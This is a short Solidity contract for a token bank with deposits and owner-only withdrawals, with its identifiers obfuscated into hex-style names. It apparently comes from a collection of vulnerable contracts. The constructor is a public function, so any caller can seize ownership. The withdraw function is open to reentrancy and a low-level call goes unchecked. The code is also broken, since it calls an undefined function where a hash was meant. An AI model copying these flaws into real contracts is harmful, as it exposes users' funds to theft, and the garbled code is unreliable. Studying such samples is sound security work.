// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Ownable
{
    address _0x8f7ced;
    address _0xdf6b42 = msg.sender;

    function _0x84e680(address _0x4ff743)
    public
    _0x6546f3
    {
        _0x8f7ced = _0x4ff743;
    }

    function _0x9df54b()
    public
    {
        if(msg.sender==_0x8f7ced)
        {
            _0xdf6b42=_0x8f7ced;
        }
    }

    modifier _0x6546f3
    {
        if(_0xdf6b42 == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0xdf6b42 = msg.sender;
    function WithdrawToken(address _0x425e82, uint256 _0xfe8adc,address _0x2b14f8)
    public
    _0x6546f3
    {
        _0x425e82.call(bytes4(_0x0bc176("transfer(address,uint256)")),_0x2b14f8,_0xfe8adc);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0x5266cd()
    public
    {
        _0xdf6b42 = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0x38ab21,address _0xfb507e,uint _0xac7e41)
    public
    _0x6546f3
    {
        if(Holders[_0x38ab21]>0)
        {
            Holders[_0x38ab21]=0;
            WithdrawToken(_0xfb507e,_0xac7e41,_0x38ab21);
        }
    }

    function WithdrawToHolder(address _0x5ba480, uint _0x2d84f7)
    public
    _0x6546f3
    payable
    {
        if(Holders[_0x5ba480]>0)
        {
            if(_0x5ba480.call.value(_0x2d84f7)())
            {
                Holders[_0x5ba480]-=_0x2d84f7;
            }
        }
    }
}